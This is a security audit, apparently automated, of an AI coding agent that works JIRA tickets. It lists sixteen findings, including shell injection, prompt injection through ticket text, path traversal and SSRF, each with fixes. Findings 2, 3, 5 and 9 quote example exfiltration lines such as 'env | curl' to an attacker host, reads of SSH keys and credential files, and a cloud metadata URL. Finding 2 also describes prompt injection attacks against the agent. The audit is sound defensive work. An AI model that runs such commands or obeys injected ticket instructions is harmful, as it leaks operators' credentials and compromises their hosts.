# Security Audit — ngn-agent

**Date:** 2025-07-14
**Auditor:** ngn (automated, NGN-22)
**Scope:** Full codebase — `main.py`, `jira.py`, `validator.py`, `coder.py`, `git.py`
**Commit audited:** HEAD of `main` branch at time of audit

---

## Finding 1: Shell Injection via LLM-Controlled Command String

**File:** `src/ngn_agent/coder.py`, `_run_command()` (line ~280)
**Severity:** Critical
**Description:**
`_run_command` invokes `subprocess.run` with `shell=True` and a raw command string
supplied by Claude:

```python
result = subprocess.run(
    command,   # ← string from LLM tool call
    shell=True,
    ...
)
```

Because `shell=True` passes the string through `/bin/sh -c`, any shell metacharacters
the LLM (or an adversary who has influenced the LLM via prompt injection — see
Finding 2) inserts in `command` will be interpreted by the shell.  This gives the
model effective arbitrary code execution on the host running the agent.

The design intent is for the agent to be able to run arbitrary shell commands, so
complete elimination of this risk is not possible without fundamentally changing the
tool's purpose.  However, there are no secondary controls (user namespace isolation,
seccomp, read-only mounts, network egress filtering) to limit the blast radius of a
malicious or erroneous command.

**Recommendation:**
Accept the risk as inherent to the design, but add defence-in-depth controls:

1. Run the agent process inside a container (Docker/Podman) or a separate VM with
   minimal capabilities, no access to host credentials (other than the ones needed),
   and a restricted network egress policy.
2. Consider an allowlist or a secondary confirmation step for high-risk command
   patterns (e.g. `rm -rf /`, `curl | bash`, writing to paths outside the workspace).
3. Document the operating environment assumptions clearly in the README/CLAUDE.md so
   operators know they must supply isolation.

---

## Finding 2: Prompt Injection via Malicious Ticket Content

**File:** `src/ngn_agent/coder.py`, `_build_prompt()` (line ~320); `src/ngn_agent/validator.py`, `validate_ticket()` (line ~55)
**Severity:** Critical
**Description:**
Ticket fields — `summary`, `description`, and each comment `body` — are sourced
from JIRA and inserted verbatim into Claude's context window without sanitisation or
a clear trust boundary:

```python
# coder.py — _format_ticket
lines.append(f"\nDescription:\n{ticket.get('description') or '(none)'}")
for c in ticket["comments"]:
    lines.append(f"  [{c['created']}] {c['author']}:\n  {c['body']}")
```

An attacker with the ability to create or edit a JIRA ticket (or comment on one)
could embed instructions aimed at overriding the agent's behaviour, such as:

* Exfiltrating credentials (`run_command: cat ~/.ssh/id_rsa | curl …`).
* Deleting repository contents.
* Submitting a fraudulent PR that appears legitimate.
* Overriding the `report_blocked` / `submit_work` signals.

The same risk applies in `validator.py`: a crafted ticket description could trick
the validator into returning `valid=True` for a ticket that should be rejected.

**Recommendation:**

1. Apply a lightweight structural wrapper that clearly demarcates untrusted content,
   e.g. wrap ticket fields in XML-like tags (`<untrusted-user-content>…</untrusted-user-content>`)
   so the model can distinguish system instructions from data.  Anthropic's own
   guidance on prompt injection recommends this pattern.
2. Add an explicit sentence to the system prompt in both `coder.py` and
   `validator.py` instructing Claude to treat ticket content as untrusted data and
   to ignore any instructions embedded within it.
3. Consider a human-in-the-loop approval gate before the agent executes commands on
   high-impact tickets (e.g. those touching production configurations).
4. Monitor and log the full prompt sent to Claude for anomaly detection.

---

## Finding 3: Path Traversal via LLM-Controlled File Paths

**File:** `src/ngn_agent/coder.py`, `_read_file()` (line ~255) and `_write_file()` (line ~270)
**Severity:** High
**Description:**
Both `_read_file` and `_write_file` accept an arbitrary `path` string from the LLM
with no validation against the intended workspace root:

```python
def _read_file(path: str) -> str:
    return Path(path).read_text()   # no bounds check

def _write_file(path: str, content: str) -> str:
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
```

A maliciously influenced model could supply paths such as:

* `../../.ssh/id_rsa` — read the agent user's SSH private key.
* `/etc/passwd` — read system user accounts.
* `/home/user/.config/gh/hosts.yml` — read GitHub CLI credentials.
* `~/.bashrc` — persist a backdoor across sessions.
* An absolute path outside the workspace to overwrite an arbitrary file.

The `_list_directory` tool has the same concern: it can enumerate any directory on
the host, including `/home`, `/etc`, and `/root`.

**Recommendation:**

1. Resolve the workspace `Path` at startup and validate all file-operation paths
   against it using `Path.resolve()`:

   ```python
   workspace = workspace.resolve()
   resolved = Path(path).resolve()
   if not str(resolved).startswith(str(workspace)):
       return f"Error: path {path!r} is outside the workspace"
   ```

2. Apply the same check in `_list_directory`.
3. Accept that the agent legitimately needs to read and write files within the
   cloned repository; the mitigation only prevents escaping the workspace root.

---

## Finding 4: Credential Exposure via Exception Messages in JIRA Comments

**File:** `src/ngn_agent/main.py`, `poll_once()` (line ~175); `src/ngn_agent/jira.py`, `validate_setup()` (line ~140)
**Severity:** High
**Description:**
In several error-handling paths, raw exception messages are posted as comments on
JIRA tickets or appended to check results that are printed to stdout:

```python
# jira.py — validate_setup
except Exception as exc:
    results.append({"name": "JIRA authentication", "passed": False, "detail": str(exc)})
```

```python
# main.py — poll_once
lines = [
    "This ticket has been blocked by Agent ngn.",
    f"The repository could not be cloned: {exc}",    # RuntimeError from git.py
]
jira.post_comment(ticket["key"], lines, mention=mention)
```

If an exception message contains a credential value (e.g. the API token in a URL
constructed by `httpx`, or an authentication challenge from the server that echoes
request headers), it will be recorded in JIRA — visible to any JIRA user who can
view the ticket.

Similarly, `validate_setup` calls `str(exc)` on generic `Exception` objects and
includes the result in the printed validation report.  Some HTTP client libraries
(including `httpx`) include the full request URL — potentially containing query
parameters — in exception messages.

**Recommendation:**

1. Audit each `except Exception as exc: ... str(exc)` site and decide whether the
   full exception string is safe to surface.  At a minimum, catch specific exception
   types (e.g. `httpx.HTTPStatusError`) where the information is predictable, and
   provide only a generic message for unexpected exceptions:

   ```python
   except Exception:
       log.exception("Unexpected error during JIRA auth check")
       results.append({"name": "JIRA authentication", "passed": False,
                       "detail": "unexpected error — see agent logs"})
   ```

2. Log the full exception internally (via `log.exception`) while posting only a
   safe summary to JIRA comments.
3. Review the `httpx` exception hierarchy to confirm URLs are not included in
   serialised exception messages for the versions in use.

---

## Finding 5: Unvalidated External Repo URL Passed to Git Subprocesses

**File:** `src/ngn_agent/main.py`, `poll_once()` (line ~155); `src/ngn_agent/git.py`, `clone_repo()` and `find_resume_branch()`
**Severity:** High
**Description:**
The repository URL is extracted from the ticket by Claude's validator:

```python
result = validate_ticket(ticket, claude, ancestors=ancestors or None)
repo_url = result.get("repo_url", "")
clone_repo(repo_url, workspace)
```

This URL is then passed to `git clone` and `git ls-remote` as a list argument
(not via a shell string), which prevents classic shell injection:

```python
subprocess.run(["git", "clone", repo_url, str(dest)], ...)
subprocess.run(["git", "ls-remote", "--heads", repo_url, ...], ...)
```

However, several secondary risks remain:

1. **Protocol abuse:** Git supports `file://`, `ssh://`, `git://`, `http://`, and
   custom helpers.  A URL like `file:///etc/passwd` would attempt to clone the
   local filesystem.  A `git://` URL points to an unauthenticated protocol.
   An `ext::` or `git remote-ext` helper URL could execute arbitrary code on
   the agent host even without `shell=True`.
2. **SSRF:** An `http://` URL pointing to an internal service (e.g.,
   `http://169.254.169.254/latest/meta-data/` on AWS) would cause the agent's
   host to make a network request to that address, potentially leaking metadata
   credentials.
3. **LLM hallucination:** Claude may extract an incorrect URL, causing a clone of
   an unintended repository.

**Recommendation:**

1. Validate `repo_url` against an allowlist of permitted URL schemes
   (`https://` only, or `https://` plus `git@` SSH) before passing it to any
   subprocess.
2. Validate the hostname against a known-good list (e.g. `github.com`,
   `gitlab.com`) if the use case permits it.
3. Reject URLs matching private/link-local IP ranges or known metadata endpoints.

---

## Finding 6: No Timeout on `git clone` or `git ls-remote`

**File:** `src/ngn_agent/git.py`, `clone_repo()` (line ~20) and `find_resume_branch()` (line ~40)
**Severity:** Medium
**Description:**
Both subprocess calls in `git.py` omit a `timeout` parameter:

```python
# clone_repo
result = subprocess.run(
    ["git", "clone", repo_url, str(dest)],
    capture_output=True,
    text=True,
    # no timeout=
)

# find_resume_branch
result = subprocess.run(
    ["git", "ls-remote", "--heads", repo_url, ...],
    capture_output=True,
    text=True,
    # no timeout=
)
```

If the remote host is unreachable or intentionally slow (e.g. a tarpit), the agent
process will hang indefinitely, blocking the polling loop for all subsequent tickets.

By contrast, `_run_command` in `coder.py` already sets `timeout=120`, which is good.
The inconsistency suggests the omission in `git.py` was inadvertent.

**Recommendation:**

Add `timeout=` arguments to both subprocess calls:

```python
subprocess.run([...], capture_output=True, text=True, timeout=300)   # clone
subprocess.run([...], capture_output=True, text=True, timeout=30)    # ls-remote
```

Catch `subprocess.TimeoutExpired` and convert it to a `RuntimeError` (for
`clone_repo`) or return `False` (for `find_resume_branch`).

---

## Finding 7: No Timeout on `git checkout` in `poll_once`

**File:** `src/ngn_agent/main.py`, `poll_once()` (line ~165)
**Severity:** Medium
**Description:**
When resuming from an existing branch, `poll_once` calls `git checkout` via
`subprocess.run` without a timeout:

```python
subprocess.run(
    ["git", "-C", str(workspace), "checkout", ticket_branch],
    check=True,
)
```

Although `git checkout` on an already-cloned local repo is unlikely to hang, it does
interact with any configured Git hooks (e.g. `post-checkout`), which could block
indefinitely.

**Recommendation:**
Add `timeout=60` (or similar) to the call and handle `subprocess.TimeoutExpired`.

---

## Finding 8: Credential Exposure via Agent Logging

**File:** `src/ngn_agent/jira.py`, `JiraClient.__init__()` (line ~25); `src/ngn_agent/main.py`, general logging
**Severity:** Medium
**Description:**
`JiraClient` stores credentials as instance attributes (`self.auth`).  While they are
not logged directly, exceptions raised by `httpx` HTTP calls may include the request
object — potentially including `Authorization` headers — in their string
representation, and those exceptions are sometimes passed to `log.exception` or
`str(exc)`.

Additionally, the `ANTHROPIC_API_KEY`, `JIRA_API_TOKEN`, and `JIRA_EMAIL` values are
read from environment variables.  If the logging level is ever set to `DEBUG`, third-
party libraries (`httpx`, `anthropic`) may log request headers or full URLs
containing these values.

**Recommendation:**

1. Ensure the logging configuration in `main.py` suppresses `DEBUG`-level output
   from `httpx` and `anthropic` (already partially done with `.setLevel(logging.WARNING)`
   — verify this is effective for all relevant loggers, including `httpx.client` and
   `anthropic._base_client`).
2. Do not log credential values even at `DEBUG` level in application code.
3. When handling `httpx` exceptions, avoid calling `str(exc)` in a context where the
   result may be written to an external system (JIRA comments, PR descriptions).

---

## Finding 9: `ANTHROPIC_API_KEY` Present in Agent Process Environment

**File:** `src/ngn_agent/main.py`, `main()` (line ~75)
**Severity:** Medium
**Description:**
The Anthropic API key is passed as `api_key=os.environ["ANTHROPIC_API_KEY"]` to the
`anthropic.Anthropic` client.  The key remains available in `os.environ` for the
lifetime of the process.

Because `_run_command` executes arbitrary shell commands as child processes of the
agent, those child processes inherit the full environment — including
`ANTHROPIC_API_KEY`, `JIRA_API_TOKEN`, and `JIRA_EMAIL`.  An LLM-generated command
such as `env | curl -d @- https://attacker.example.com` would exfiltrate all
credentials.

**Recommendation:**

1. Scrub sensitive environment variables from the environment before spawning child
   processes, or use `subprocess.run(..., env={...})` to provide a clean, minimal
   environment to each command:

   ```python
   import os
   _SAFE_ENV_KEYS = {"PATH", "HOME", "USER", "LANG", "TERM"}
   child_env = {k: v for k, v in os.environ.items() if k in _SAFE_ENV_KEYS}
   subprocess.run(command, shell=True, env=child_env, ...)
   ```

2. After constructing the API clients in `main()`, consider deleting the raw key
   strings from `os.environ`:

   ```python
   os.environ.pop("ANTHROPIC_API_KEY", None)
   os.environ.pop("JIRA_API_TOKEN", None)
   ```

---

## Finding 10: Workspace Directory Traversal via Ticket Key

**File:** `src/ngn_agent/main.py`, `poll_once()` (line ~155)
**Severity:** Medium
**Description:**
The workspace path is constructed by appending the JIRA ticket key directly:

```python
workspace = (Path(os.environ.get("WORKSPACE_DIR", "workspaces")) / ticket["key"]).resolve()
```

JIRA ticket keys normally follow the pattern `PROJECT-123`, which is safe.  However,
if a ticket key were manipulated to contain path separators (e.g. `../../../tmp/evil`)
— either through a JIRA misconfiguration, a custom field, or an API response that
has been tampered with — the `resolve()` call would produce a path outside the
intended workspace directory.

Under normal JIRA operation this is unlikely, but it is a latent risk worth
documenting.

**Recommendation:**

After constructing `workspace`, verify it is a subdirectory of the intended base:

```python
workspace_base = Path(os.environ.get("WORKSPACE_DIR", "workspaces")).resolve()
workspace = (workspace_base / ticket["key"]).resolve()
if not str(workspace).startswith(str(workspace_base) + os.sep):
    raise ValueError(f"Ticket key {ticket['key']!r} produced an unsafe workspace path")
```

---

## Finding 11: Filter ID Injected into JQL Query String

**File:** `src/ngn_agent/jira.py`, `get_tickets_from_filter()` (line ~75)
**Severity:** Low
**Description:**
The JIRA filter ID — taken from the `JIRA_FILTER_ID` environment variable — is
interpolated directly into a JQL string:

```python
"jql": f"filter={filter_id} AND issuetype in (Bug, Task, Story) AND status = READY",
```

If `JIRA_FILTER_ID` contains unexpected characters (e.g. a space, quotes, or a JQL
keyword), this could corrupt the query or, in a worst-case scenario, allow JQL
injection.  The filter ID is operator-controlled (set in the environment), so the
practical risk is low; however, the code trusts that the environment variable is a
numeric ID without validating it.

**Recommendation:**
Validate that `filter_id` matches the expected numeric format before use:

```python
import re
if not re.fullmatch(r"\d+", filter_id):
    raise ValueError(f"JIRA_FILTER_ID must be a numeric string, got: {filter_id!r}")
```

---

## Finding 12: JIRA Base URL Not Validated — Potential SSRF / Misconfiguration

**File:** `src/ngn_agent/jira.py`, `JiraClient.__init__()` (line ~25)
**Severity:** Low
**Description:**
`JIRA_BASE_URL` is accepted and used without validation:

```python
self.base_url = os.environ["JIRA_BASE_URL"].rstrip("/")
```

All subsequent API calls build URLs from this base.  If the value is misconfigured
(e.g. points to an internal HTTP endpoint or an attacker-controlled server), the
agent will send JIRA credentials to that address.

**Recommendation:**
Validate that `JIRA_BASE_URL` uses the `https://` scheme at startup, and optionally
that the hostname ends with `atlassian.net` for cloud instances:

```python
from urllib.parse import urlparse
parsed = urlparse(base_url)
if parsed.scheme != "https":
    raise ValueError("JIRA_BASE_URL must use https://")
```

---

## Finding 13: No Rate-Limit or Retry Handling for JIRA API Calls

**File:** `src/ngn_agent/jira.py`, all HTTP methods
**Severity:** Low
**Description:**
Every JIRA API call in `JiraClient` uses a bare `httpx.get` / `httpx.post` /
`httpx.put` with no retry logic and no explicit `timeout` parameter.  If the JIRA
API returns a `429 Too Many Requests` response, the agent will raise an unhandled
`httpx.HTTPStatusError` rather than retrying.  If the network is slow, the default
`httpx` timeout (5 seconds) may cause spurious failures.

By contrast, both `coder.py` and `validator.py` implement robust retry loops for
Anthropic API calls.

**Recommendation:**

1. Add `timeout=30` (or similar) to all `httpx` calls in `JiraClient`.
2. Implement a simple retry wrapper for JIRA calls, at minimum retrying on HTTP 429
   and 503 responses with exponential backoff.

---

## Finding 14: Dependency on `httpx` and `anthropic` — Supply-Chain Risk

**File:** `pyproject.toml`
**Severity:** Informational
**Description:**
The agent depends on two third-party libraries:

* **`anthropic>=0.40.0`** — the official Anthropic Python SDK.  This library
  transmits the full conversation (including ticket content and file contents) to
  Anthropic's API.  Operators must trust Anthropic's data handling and privacy
  policies.  Any malicious update to this package could intercept API keys or
  responses.
* **`httpx>=0.27`** — a widely-used HTTP client.  It handles all JIRA
  communication, including transmission of `JIRA_API_TOKEN`.

Both packages use lower-bound version pins (`>=`), meaning a `uv sync` or `pip
install` will always pull the latest available version.  A supply-chain compromise
of either package could have severe consequences.

**Recommendation:**

1. Pin dependencies to exact versions in `uv.lock` and commit the lock file to
   source control (already done for `uv.lock`).  Treat any lock-file update as a
   change requiring review.
2. Consider adding a dependency audit step (e.g. `pip-audit` or GitHub's Dependabot)
   to CI to alert on known vulnerabilities in pinned versions.
3. Evaluate whether the `anthropic` SDK's data retention and privacy settings are
   acceptable for the sensitivity of the JIRA content being sent.

---

## Finding 15: `subprocess.run` Without `check=True` in `find_resume_branch`

**File:** `src/ngn_agent/git.py`, `find_resume_branch()` (line ~45)
**Severity:** Informational
**Description:**
`find_resume_branch` does not check the return code of `git ls-remote`:

```python
result = subprocess.run(
    ["git", "ls-remote", "--heads", repo_url, ...],
    capture_output=True,
    text=True,
)
return bool(result.stdout.strip())
```

If `git ls-remote` fails (non-zero exit) for a reason other than an exception (e.g.
authentication error), the function silently returns `False` and the agent proceeds
as if no resume branch exists — which is the safe fallback behaviour.  This is
intentional and documented in the docstring, but means authentication failures or
network errors during this check are silently swallowed.

**Recommendation:**
Log the return code and `stderr` at `DEBUG` level when the command fails, so
operators can diagnose unexpected fallback-to-fresh-start behaviour:

```python
if result.returncode != 0:
    log.debug("git ls-remote exited %d: %s", result.returncode, result.stderr.strip())
```

---

## Finding 16: Agent Comments May Expose Internal Implementation Details

**File:** `src/ngn_agent/main.py`, `poll_once()` (line ~175, ~200)
**Severity:** Informational
**Description:**
JIRA comments posted by the agent include the `blocked_reason` string from
`implement_ticket`, which is often sourced from the LLM's own `report_blocked` call
or from internal Python exception messages:

```python
lines = [
    "Implementation was blocked by Agent ngn.",
    f"Reason: {impl['blocked_reason']}",
]
jira.post_comment(ticket["key"], lines, ...)
```

These messages may expose internal file paths, stack traces, or other implementation
details to JIRA users, depending on what the LLM chose to put in its `reason` field.

**Recommendation:**
Review whether the full `blocked_reason` should be posted publicly.  Consider
truncating long reasons and logging the full text internally only.

---

## Summary

| Severity      | Count |
|---------------|-------|
| Critical      | 2     |
| High          | 3     |
| Medium        | 5     |
| Low           | 3     |
| Informational | 3     |
| **Total**     | **16** |

### Critical findings (immediate attention recommended)

* **Finding 1 — Shell injection:** The agent executes LLM-supplied shell commands
  with `shell=True`.  Without OS-level isolation (containers, VMs), a single
  malicious or erroneous command can compromise the host.
* **Finding 2 — Prompt injection:** Ticket content is passed verbatim into Claude's
  context.  An attacker who can write to a JIRA ticket can attempt to override the
  agent's instructions.

### Overall recommendations

1. **Isolate the agent process.** Run ngn-agent inside a container or VM with a
   minimal capability set, restricted network egress, no access to host SSH keys,
   and the cloned workspace as the only writable volume.  This is the single most
   impactful control given the design intent of running arbitrary shell commands.

2. **Add prompt injection mitigations.** Wrap ticket content in clearly labelled
   untrusted-data markers and add system-prompt instructions to ignore embedded
   directives.

3. **Enforce path boundaries.** Resolve all file-operation paths and reject those
   that escape the workspace root.

4. **Scrub credentials from child-process environments.** Do not inherit
   `ANTHROPIC_API_KEY`, `JIRA_API_TOKEN`, etc. into subprocesses spawned by
   `_run_command`.

5. **Add timeouts to all subprocess calls.** `git clone`, `git ls-remote`, and
   `git checkout` in `git.py` and `main.py` are missing `timeout` parameters.

6. **Sanitise exception messages before posting to JIRA.** Log full details
   internally; post only safe summaries externally.
